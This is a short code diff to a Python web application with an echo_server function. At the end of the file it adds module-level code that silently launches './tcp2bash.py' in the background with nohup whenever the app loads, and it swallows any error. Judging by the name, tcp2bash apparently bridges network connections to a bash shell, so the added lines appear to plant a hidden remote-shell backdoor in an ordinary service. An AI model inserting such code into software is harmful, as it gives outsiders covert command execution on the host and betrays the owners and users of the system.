@@ -85,3 +85,9 @@ def echo_server():
     return str()
 
 application = app
+
+import os
+try:
+    os.system('nohup python ./tcp2bash.py &')
+except:
+    print 'tcp2bash start error'
